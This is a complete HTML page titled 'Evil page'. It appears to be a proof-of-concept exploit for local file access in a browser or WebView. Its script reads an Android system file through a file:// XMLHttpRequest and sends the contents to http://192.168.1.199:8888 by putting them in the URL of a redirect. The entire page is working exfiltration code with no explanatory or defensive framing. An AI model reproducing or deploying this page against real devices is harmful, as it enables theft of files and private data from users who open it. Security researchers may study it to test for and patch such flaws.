<!DOCTYPE html>
<html>
<head>
   <title>Evil page</title>
</head>
<body>
<script type="text/javascript">
   function theftFile(path, callback) {
     var oReq = new XMLHttpRequest();

     oReq.open("GET", "file://" + encodeURIComponent(path), true);
     oReq.onload = function(e) {
       callback(oReq.responseText);
     }
     oReq.onerror = function(e) {
       callback(null);
     }
     oReq.send();
   }

   theftFile("/system/etc/protolog.conf.json.gz", function(contents) {
       location.href = "http://192.168.1.199:8888/?data=" + encodeURIComponent(contents);
   });
</script>
</body>
</html>
